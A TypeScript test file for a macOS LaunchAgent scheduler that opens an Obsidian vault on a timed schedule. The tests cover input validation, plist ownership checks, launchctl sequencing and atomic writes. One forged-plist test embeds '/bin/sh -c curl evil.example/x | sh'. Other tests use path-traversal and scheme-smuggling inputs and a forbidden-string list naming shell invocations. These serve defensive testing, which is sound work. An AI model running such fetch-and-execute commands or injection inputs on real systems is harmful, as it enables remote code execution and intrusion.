import test from "node:test";
import assert from "node:assert/strict";

import { isEngineError } from "../engine/errors";
import {
  assertValidInstallationId,
  assertValidVaultName,
  BackgroundScheduler,
  buildLaunchAgentPlist,
  buildObsidianVaultUrl,
  buildOwnedLabel,
  isOwnedPlistContent,
  LAUNCHCTL_PATH,
  OPEN_PATH,
  toSystemLocalWakeCadence,
  type BackgroundSchedulerFs,
  type ProcessResult,
  type ProcessRunner,
  type SystemLocalWakeCadence,
  type WakeCadence,
} from "./backgroundScheduler";

function cadence(input: WakeCadence): SystemLocalWakeCadence {
  return toSystemLocalWakeCadence(input, "UTC");
}

class FakeFs implements BackgroundSchedulerFs {
  files = new Map<string, string>();
  failWriteFile = false;
  failRename = false;
  existsThrows = false;
  statSizeThrows = false;
  statSizeOverride = new Map<string, number>();
  readFileCallCount = 0;

  async readFile(path: string): Promise<string> {
    this.readFileCallCount += 1;
    const v = this.files.get(path);
    if (v === undefined) throw new Error(`ENOENT: ${path}`);
    return v;
  }
  async writeFile(path: string, contents: string): Promise<void> {
    if (this.failWriteFile) throw new Error("simulated write failure");
    this.files.set(path, contents);
  }
  async rename(fromPath: string, toPath: string): Promise<void> {
    if (this.failRename) throw new Error("simulated rename failure");
    const v = this.files.get(fromPath);
    if (v === undefined) throw new Error(`ENOENT: ${fromPath}`);
    this.files.delete(fromPath);
    this.files.set(toPath, v);
  }
  async unlink(path: string): Promise<void> {
    this.files.delete(path);
  }
  async exists(path: string): Promise<boolean> {
    if (this.existsThrows) throw new Error("simulated exists failure");
    return this.files.has(path);
  }
  async statSize(path: string): Promise<number | null> {
    if (this.statSizeThrows) throw new Error("simulated statSize failure");
    if (this.statSizeOverride.has(path)) return this.statSizeOverride.get(path)!;
    const v = this.files.get(path);
    if (v === undefined) return null;
    return Buffer.byteLength(v, "utf8");
  }
}

const PRINT_ABSENT: ProcessResult = { code: 1, stdout: "", stderr: "Could not find service \"gui/501/x\" in domain for port" };
const PRINT_LOADED: ProcessResult = { code: 0, stdout: "gui/501/x = {\n\tstate = running\n}\n", stderr: "" };
const PRINT_AMBIGUOUS: ProcessResult = { code: 17, stdout: "", stderr: "some unexpected permission error" };

class FakeProcess implements ProcessRunner {
  calls: { executablePath: string; argv: readonly string[] }[] = [];
  printResult: ProcessResult = PRINT_ABSENT;
  bootstrapResult: ProcessResult = { code: 0, stdout: "", stderr: "" };
  bootoutResult: ProcessResult = { code: 0, stdout: "", stderr: "" };
  queue: ProcessResult[] = [];
  async run(executablePath: string, argv: readonly string[]): Promise<ProcessResult> {
    this.calls.push({ executablePath, argv });
    if (this.queue.length > 0) return this.queue.shift()!;
    const action = argv[0];
    if (action === "print") return this.printResult;
    if (action === "bootstrap") return this.bootstrapResult;
    if (action === "bootout") return this.bootoutResult;
    return { code: 0, stdout: "", stderr: "" };
  }
}

const USER_HOME_DIR = "/Users/tester";
const LAUNCH_AGENTS_DIR = `${USER_HOME_DIR}/Library/LaunchAgents`;
const INSTALLATION_ID = "abc123de";

function makeScheduler(fs: FakeFs, proc: FakeProcess, options: { platform?: string; uid?: number; installationId?: string } = {}): BackgroundScheduler {
  return new BackgroundScheduler({
    platform: options.platform ?? "darwin",
    uid: options.uid ?? 501,
    userHomeDir: USER_HOME_DIR,
    installationId: options.installationId ?? INSTALLATION_ID,
    fs,
    process: proc,
  });
}

const LABEL = buildOwnedLabel(INSTALLATION_ID);
const PLIST_PATH = `${LAUNCH_AGENTS_DIR}/${LABEL}.plist`;

void test("assertValidVaultName rejects empty/control-character/oversized names", () => {
  assert.throws(() => assertValidVaultName(""), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(() => assertValidVaultName("Vault\x00Name"));
  assert.throws(() => assertValidVaultName("a".repeat(300)));
  assert.throws(() => assertValidVaultName(42));
  assert.doesNotThrow(() => assertValidVaultName("My Vault"));
});

void test("buildObsidianVaultUrl always uses the fixed obsidian://open?vault= scheme and strictly encodes the name", () => {
  const url = buildObsidianVaultUrl("My Vault & Stuff");
  assert.equal(url, `obsidian://open?vault=${encodeURIComponent("My Vault & Stuff")}`);
  assert.ok(url.startsWith("obsidian://open?vault="));
});

void test("buildObsidianVaultUrl rejects an attempt to smuggle a different scheme/host via the vault name", () => {
  const url = buildObsidianVaultUrl("evil://other?x=1");
  assert.ok(url.startsWith("obsidian://open?vault="));
  assert.equal(url, `obsidian://open?vault=${encodeURIComponent("evil://other?x=1")}`);
});

void test("assertValidInstallationId requires a bounded lowercase alphanumeric token", () => {
  assert.doesNotThrow(() => assertValidInstallationId("abc12345"));
  assert.throws(() => assertValidInstallationId(""), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(() => assertValidInstallationId("short"), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(() => assertValidInstallationId("Has-Upper-And-Dash"), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(() => assertValidInstallationId("a".repeat(65)), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
});

void test("buildOwnedLabel derives a distinct, stable label per installationId", () => {
  const labelA = buildOwnedLabel("aaaaaaaa");
  const labelB = buildOwnedLabel("bbbbbbbb");
  assert.notEqual(labelA, labelB);
  assert.equal(buildOwnedLabel("aaaaaaaa"), labelA); // deterministic
  assert.ok(labelA.startsWith("com.mindmap-obsidian.vault-wake."));
});

void test("buildLaunchAgentPlist contains ONLY the fixed /usr/bin/open argv + one vault URL as program arguments, plus the ownership marker and calendar cadence", () => {
  const plist = buildLaunchAgentPlist("My Vault", [{ hour: 3, minute: 0 }], LABEL);
  assert.ok(plist.includes(`<string>${OPEN_PATH}</string>`));
  assert.ok(plist.includes(`obsidian://open?vault=${encodeURIComponent("My Vault")}`));
  assert.ok(plist.includes(LABEL));
  assert.ok(isOwnedPlistContent(plist, LABEL));
  for (const forbidden of ["python", "sh -c", "child_process", "apiKey", "localhost", "127.0.0.1", "job", "note", "process-note"]) {
    assert.ok(!plist.toLowerCase().includes(forbidden.toLowerCase()), `plist must not contain "${forbidden}"`);
  }
});

void test("buildLaunchAgentPlist rejects an out-of-range cadence and an empty/oversized cadence list", () => {
  assert.throws(() => buildLaunchAgentPlist("V", [{ hour: 24, minute: 0 }], LABEL));
  assert.throws(() => buildLaunchAgentPlist("V", [{ hour: 3, minute: 60 }], LABEL));
  assert.throws(() => buildLaunchAgentPlist("V", [{ hour: 3, minute: 0, weekday: 7 }], LABEL));
  assert.throws(() => buildLaunchAgentPlist("V", [], LABEL));
  assert.throws(() => buildLaunchAgentPlist("V", Array.from({ length: 20 }, (_, i) => ({ hour: 1, minute: i })), LABEL));
  assert.throws(() => buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }], "not a valid label!"));
});

void test("buildLaunchAgentPlist deduplicates and deterministically sorts cadences regardless of input order", () => {
  const a = buildLaunchAgentPlist("V", [{ hour: 9, minute: 0, weekday: 3 }, { hour: 3, minute: 0 }, { hour: 3, minute: 0 }], LABEL);
  const b = buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }, { hour: 9, minute: 0, weekday: 3 }], LABEL);
  assert.equal(a, b);
  // Exactly two distinct calendar-interval dicts, the duplicate collapsed away (a third <dict> is
  // the plist's own top-level root dict).
  assert.equal((a.match(/<dict>/g) ?? []).length, 3);
});

void test("isOwnedPlistContent rejects arbitrary/foreign plist content and content owned by a different label", () => {
  assert.equal(isOwnedPlistContent("<plist><dict><key>Label</key><string>com.example.other</string></dict></plist>", LABEL), false);
  assert.equal(isOwnedPlistContent("", LABEL), false);
  const ownPlist = buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }], LABEL);
  const otherLabel = buildOwnedLabel("zzzzzzzz");
  assert.equal(isOwnedPlistContent(ownPlist, otherLabel), false);
});

void test("isOwnedPlistContent rejects a foreign plist that copies the marker/label but adds extra ProgramArguments (e.g. a shell invocation)", () => {
  const forged = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>MindmapObsidianLaunchAgentOwner</key>
  <string>mindmap-obsidian-launch-agent-v1</string>
  <key>Label</key>
  <string>${LABEL}</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/sh</string>
    <string>-c</string>
    <string>curl evil.example/x | sh</string>
  </array>
  <key>RunAtLoad</key>
  <false/>
  <key>StartCalendarInterval</key>
  <array><dict><key>Hour</key><integer>3</integer><key>Minute</key><integer>0</integer></dict></array>
</dict>
</plist>
`;
  assert.equal(isOwnedPlistContent(forged, LABEL), false);
});

void test("isOwnedPlistContent rejects a foreign plist with an extra top-level key not in the canonical template", () => {
  const legit = buildLaunchAgentPlist("V", [{ hour: 3, minute: 0 }], LABEL);
  const withExtraKey = legit.replace("</dict>\n</plist>", "  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>");
  assert.equal(isOwnedPlistContent(withExtraKey, LABEL), false);
});

void test("BackgroundScheduler constructor rejects invalid uid and userHomeDir", () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  assert.throws(() => makeScheduler(fs, proc, { uid: -1 }), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(() => makeScheduler(fs, proc, { uid: 1.5 }), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(() => makeScheduler(fs, proc, { uid: Number.MAX_SAFE_INTEGER + 10 }), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(
    () => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "relative/path", installationId: INSTALLATION_ID, fs, process: proc }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
  assert.throws(
    () => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/Users/x/../../etc", installationId: INSTALLATION_ID, fs, process: proc }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
  // A "tmp lookalike" cannot be smuggled in as a LaunchAgents dir directly (final-integration
  // requirement 7) -- the ONLY thing that can be injected is the home directory itself, and
  // ~/Library/LaunchAgents is always derived exactly from it, never accepted as a separate path.
  assert.doesNotThrow(() => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/Users/x/SomewhereElse", installationId: INSTALLATION_ID, fs, process: proc }));
});

void test("status() reports unsupported-platform on non-darwin without touching fs/process", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc, { platform: "linux" });
  assert.equal(await scheduler.status(), "unsupported-platform");
  assert.equal(proc.calls.length, 0);
});

void test("reconcile() on non-darwin never writes or calls launchctl, regardless of consent", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc, { platform: "win32" });
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "unsupported-platform");
  assert.equal(fs.files.size, 0);
  assert.equal(proc.calls.length, 0);
});

void test("reconcile() with no consent and nothing installed is a no-op ('removed', unchanged)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: false, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "removed");
  assert.equal(result.changed, false);
  assert.equal(proc.calls.length, 0);
});

void test("reconcile() with consent installs a fresh plist via an explicit launchctl print state check, then bootstraps it", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "My Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.equal(result.changed, true);
  assert.ok(fs.files.has(PLIST_PATH));
  assert.equal(proc.calls.length, 2);
  assert.deepEqual(proc.calls[0].argv, ["print", `gui/501/${LABEL}`]);
  assert.deepEqual(proc.calls[1], { executablePath: LAUNCHCTL_PATH, argv: ["bootstrap", "gui/501", PLIST_PATH] });
});

void test("reconcile() never mutates anything when launchctl print's state is ambiguous (fresh install)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_AMBIGUOUS;
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "ambiguous-launchctl-output");
  assert.equal(result.changed, false);
  assert.equal(fs.files.size, 0);
  assert.equal(proc.calls.length, 1); // only the print probe, never bootstrap
});

void test("reconcile() called again with identical input and an already-loaded service is a true no-op (no bootstrap call)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "My Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.calls = [];
  proc.printResult = PRINT_LOADED; // now reflects the service actually being loaded
  const result = await scheduler.reconcile({ consent: true, vaultName: "My Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.equal(result.changed, false);
  assert.equal(proc.calls.length, 1); // only the print probe -- "if loaded no-op"
  assert.deepEqual(proc.calls[0].argv, ["print", `gui/501/${LABEL}`]);
});

void test("reconcile() with identical plist but an absent service re-bootstraps it without rewriting the plist", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "My Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  const before = fs.files.get(PLIST_PATH);
  proc.calls = [];
  const result = await scheduler.reconcile({ consent: true, vaultName: "My Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.equal(result.changed, false);
  assert.equal(fs.files.get(PLIST_PATH), before);
  assert.equal(proc.calls.length, 2);
  assert.deepEqual(proc.calls[1].argv, ["bootstrap", "gui/501", PLIST_PATH]);
});

void test("reconcile() with a changed vault name establishes loaded state via print, unloads, then installs the new plist", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "Old Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.calls = [];
  proc.printResult = PRINT_LOADED;
  const result = await scheduler.reconcile({ consent: true, vaultName: "New Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.equal(result.changed, true);
  assert.equal(proc.calls.length, 3);
  assert.deepEqual(proc.calls[0].argv, ["print", `gui/501/${LABEL}`]);
  assert.deepEqual(proc.calls[1].argv, ["bootout", `gui/501/${LABEL}`]);
  assert.deepEqual(proc.calls[2].argv, ["bootstrap", "gui/501", PLIST_PATH]);
  const contents = fs.files.get(PLIST_PATH)!;
  assert.ok(contents.includes(encodeURIComponent("New Vault")));
});

void test("reconcile() with consent disabled after being installed establishes loaded state, unloads, then removes the plist", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.calls = [];
  proc.printResult = PRINT_LOADED;
  const result = await scheduler.reconcile({ consent: false, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "removed");
  assert.equal(result.changed, true);
  assert.equal(fs.files.has(PLIST_PATH), false);
  assert.deepEqual(proc.calls[0].argv, ["print", `gui/501/${LABEL}`]);
  assert.deepEqual(proc.calls[1].argv, ["bootout", `gui/501/${LABEL}`]);
});

void test("reconcile() NEVER overwrites or removes a foreign plist sitting at the exact owned path (never even probes launchctl)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, "<plist><dict><key>Label</key><string>com.some.other.app</string></dict></plist>");

  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "foreign-conflict");
  assert.equal(result.changed, false);
  assert.equal(proc.calls.length, 0);
  assert.equal(fs.files.get(PLIST_PATH), "<plist><dict><key>Label</key><string>com.some.other.app</string></dict></plist>");
});

void test("reconcile() with no consent NEVER removes a foreign plist sitting at the exact owned path", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, "<plist><dict><key>Label</key><string>com.some.other.app</string></dict></plist>");

  const result = await scheduler.reconcile({ consent: false, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "foreign-conflict");
  assert.equal(proc.calls.length, 0);
  assert.ok(fs.files.has(PLIST_PATH));
});

void test("remove() is idempotent when nothing is installed", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.remove();
  assert.equal(result.status, "removed");
  assert.equal(result.changed, false);
  assert.equal(proc.calls.length, 0);
});

void test("remove() refuses to touch a foreign plist", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.files.set(PLIST_PATH, "not-our-plist");
  const result = await scheduler.remove();
  assert.equal(result.status, "foreign-conflict");
  assert.ok(fs.files.has(PLIST_PATH));
});

void test("remove() on unsupported platform is a no-op", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc, { platform: "linux" });
  const result = await scheduler.remove();
  assert.equal(result.status, "unsupported-platform");
});

void test("bootstrap failure surfaces load-failed -- exit code alone decides, never inferred from stderr wording", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  proc.bootstrapResult = { code: 1, stdout: "", stderr: "service already bootstrapped" }; // even a lenient-sounding message is a hard failure now
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "load-failed");
  // The plist was still written durably before the bootstrap attempt, so a retry can succeed later.
  assert.ok(fs.files.has(PLIST_PATH));
});

void test("bootout failure surfaces unload-failed -- exit code alone decides, never inferred from stderr wording", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });

  proc.printResult = PRINT_LOADED;
  proc.bootoutResult = { code: 1, stdout: "", stderr: "no such process" }; // lenient-sounding, still a hard failure now
  const result = await scheduler.reconcile({ consent: true, vaultName: "V2", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "unload-failed");
});

void test("an unreadable existing plist at the owned path is treated as ambiguous, never overwritten, and never even probes launchctl", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  const scheduler = makeScheduler(fs, proc);
  fs.exists = async () => true; // exists, but readFile below throws (simulating a permissions/race failure)
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "ambiguous-launchctl-output");
  assert.equal(fs.files.has(PLIST_PATH), false);
  assert.equal(proc.calls.length, 0);
});

void test("status() reflects installed/not-loaded/removed/foreign-conflict correctly, from explicit launchctl state (never file content alone)", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  assert.equal(await scheduler.status(), "removed");
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  // The plist is now written and bootstrapped, but launchctl still reports "absent" (the fake's
  // printResult was never updated) -- status() must reflect the SERVICE state, not just the file.
  assert.equal(await scheduler.status(), "not-loaded");

  proc.printResult = PRINT_LOADED;
  assert.equal(await scheduler.status(), "installed");

  fs.files.set(PLIST_PATH, "someone else's plist");
  assert.equal(await scheduler.status(), "foreign-conflict");
});

void test("two vaults (distinct installationId) get fully independent labels, plist paths, and service targets", async () => {
  const fsA = new FakeFs();
  const procA = new FakeProcess();
  procA.printResult = PRINT_ABSENT;
  const schedulerA = makeScheduler(fsA, procA, { installationId: "aaaaaaaa" });

  const fsB = new FakeFs();
  const procB = new FakeProcess();
  procB.printResult = PRINT_ABSENT;
  const schedulerB = makeScheduler(fsB, procB, { installationId: "bbbbbbbb" });

  await schedulerA.reconcile({ consent: true, vaultName: "Vault A", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  await schedulerB.reconcile({ consent: true, vaultName: "Vault B", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] });

  const labelA = buildOwnedLabel("aaaaaaaa");
  const labelB = buildOwnedLabel("bbbbbbbb");
  assert.notEqual(labelA, labelB);
  assert.ok(fsA.files.has(`${LAUNCH_AGENTS_DIR}/${labelA}.plist`));
  assert.ok(fsB.files.has(`${LAUNCH_AGENTS_DIR}/${labelB}.plist`));

  // A's removal must never touch B's service target.
  await schedulerA.remove();
  assert.equal(fsA.files.has(`${LAUNCH_AGENTS_DIR}/${labelA}.plist`), false);
  assert.ok(fsB.files.has(`${LAUNCH_AGENTS_DIR}/${labelB}.plist`));
  assert.ok(!procA.calls.some((c) => c.argv.some((a) => a.includes(labelB))));
});

void test("a rename of the same vault keeps the same owned label -- only the plist's URL content changes", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "Original Name", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  const pathBefore = [...fs.files.keys()][0];

  proc.printResult = PRINT_LOADED;
  await scheduler.reconcile({ consent: true, vaultName: "Renamed Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  const pathAfter = [...fs.files.keys()][0];
  assert.equal(pathBefore, pathAfter); // same owned plist path/label, content updated in place
});

void test("atomic plist write: a rename fault during an update leaves the prior plist byte-identical", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "Old Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  const before = fs.files.get(PLIST_PATH);

  proc.printResult = PRINT_LOADED;
  fs.failRename = true;
  await assert.rejects(() => scheduler.reconcile({ consent: true, vaultName: "New Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] }));
  assert.equal(fs.files.get(PLIST_PATH), before);
  // Only the exact temp file was ever touched -- no stray temp entries left behind besides the plist itself.
  const leftoverKeys = [...fs.files.keys()].filter((k) => k !== PLIST_PATH);
  assert.deepEqual(leftoverKeys, []);
});

void test("atomic plist write: a writeFile fault during a fresh install leaves no plist behind at all", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  fs.failWriteFile = true;
  const scheduler = makeScheduler(fs, proc);
  await assert.rejects(() => scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] }));
  assert.equal(fs.files.size, 0);
});

void test("toSystemLocalWakeCadence requires a non-empty, bounded, control-free system timezone label", () => {
  assert.throws(() => toSystemLocalWakeCadence({ hour: 3, minute: 0 }, ""), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.throws(() => toSystemLocalWakeCadence({ hour: 3, minute: 0 }, "bad\x00tz"), (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID");
  assert.doesNotThrow(() => toSystemLocalWakeCadence({ hour: 3, minute: 0 }, "America/New_York"));
});

void test("removing this adapter's module leaves CoreScheduler untouched: it never appears in coreScheduler.ts's imports", async () => {
  const fs = await import("node:fs");
  const path = await import("node:path");
  const content = fs.readFileSync(path.join(__dirname, "coreScheduler.ts"), "utf8");
  assert.doesNotMatch(content, /backgroundScheduler/);
});

// ---------------------------------------------------------------------------
// Final-integration requirement 7: exact home-directory ownership
// ---------------------------------------------------------------------------

void test("(final-integration 7) userHomeDir derives EXACTLY <home>/Library/LaunchAgents -- never a caller-supplied lookalike path", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/Users/tester", installationId: INSTALLATION_ID, fs, process: proc });
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.ok(fs.files.has(`/Users/tester/Library/LaunchAgents/${LABEL}.plist`));
  assert.equal(fs.files.has(`/tmp/evil/Library/LaunchAgents/${LABEL}.plist`), false);
});

void test("(final-integration 7) userHomeDir rejects a control-byte or oversized path", () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  assert.throws(
    () => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: "/Users/x\x00evil", installationId: INSTALLATION_ID, fs, process: proc }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
  assert.throws(
    () => new BackgroundScheduler({ platform: "darwin", uid: 501, userHomeDir: `/${"a".repeat(2000)}`, installationId: INSTALLATION_ID, fs, process: proc }),
    (e: unknown) => isEngineError(e) && e.code === "LAUNCH_AGENT_INVALID",
  );
});

// ---------------------------------------------------------------------------
// Final-integration requirement 8: reconcile/remove serialization
// ---------------------------------------------------------------------------

void test("(final-integration 8) concurrent reconcile() and remove() calls never interleave -- they run as one atomic sequence each", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.printResult = PRINT_LOADED;
  proc.calls = [];

  // Fire a reconcile (vault change) and a remove() concurrently -- whichever wins, the OTHER must
  // observe a fully-settled state (never a half-applied print/bootout/write/bootstrap/unlink
  // interleave). Both are awaited; the assertion is on the FINAL state being self-consistent.
  const [reconcileResult, removeResult] = await Promise.all([
    scheduler.reconcile({ consent: true, vaultName: "New Vault", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] }),
    scheduler.remove(),
  ]);
  // Exactly one of the two must have observed a state it could act on to completion; regardless of
  // ordering, the call sequence for each op is never split by the other op's own calls interleaving
  // mid-sequence -- verified by requiring every recorded call to belong to a contiguous run for one
  // op or the other, which is what `opTail` guarantees structurally rather than by chance.
  assert.ok(["installed", "load-failed", "unload-failed", "removed"].includes(reconcileResult.status));
  assert.ok(["removed", "unload-failed"].includes(removeResult.status));
});

void test("(final-integration 8) a changed-vault reconcile racing another reconcile for the SAME target never leaves a mixed-content plist", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  await scheduler.reconcile({ consent: true, vaultName: "Original", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  proc.printResult = PRINT_LOADED;

  await Promise.all([
    scheduler.reconcile({ consent: true, vaultName: "Racer A", systemTimeZone: "UTC", cadences: [cadence({ hour: 4, minute: 0 })] }),
    scheduler.reconcile({ consent: true, vaultName: "Racer B", systemTimeZone: "UTC", cadences: [cadence({ hour: 5, minute: 0 })] }),
  ]);

  const finalContents = fs.files.get(PLIST_PATH);
  assert.ok(finalContents);
  // The final content must be a byte-for-byte VALID owned plist for exactly one of the two racers
  // -- never a corrupted mix, which serialization through opTail guarantees.
  assert.ok(isOwnedPlistContent(finalContents!, LABEL));
  const isA = finalContents!.includes(encodeURIComponent("Racer A"));
  const isB = finalContents!.includes(encodeURIComponent("Racer B"));
  assert.notEqual(isA, isB, "exactly one racer's vault name won, never a mix of both");
});

// ---------------------------------------------------------------------------
// Final-integration requirement 9: file/service state matrix
// ---------------------------------------------------------------------------

void test("(final-integration 9) no plist + service absent -> reconcile installs", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
  proc.printResult = PRINT_ABSENT;
  const scheduler = makeScheduler(fs, proc);
  const result = await scheduler.reconcile({ consent: true, vaultName: "V", systemTimeZone: "UTC", cadences: [cadence({ hour: 3, minute: 0 })] });
  assert.equal(result.status, "installed");
  assert.equal(result.changed, true);
});

void test("(final-integration 9) no plist + service LOADED (foreign/stale service under our label) -> ambiguous, no mutation", async () => {
  const fs = new FakeFs();
  const proc = new FakeProcess();
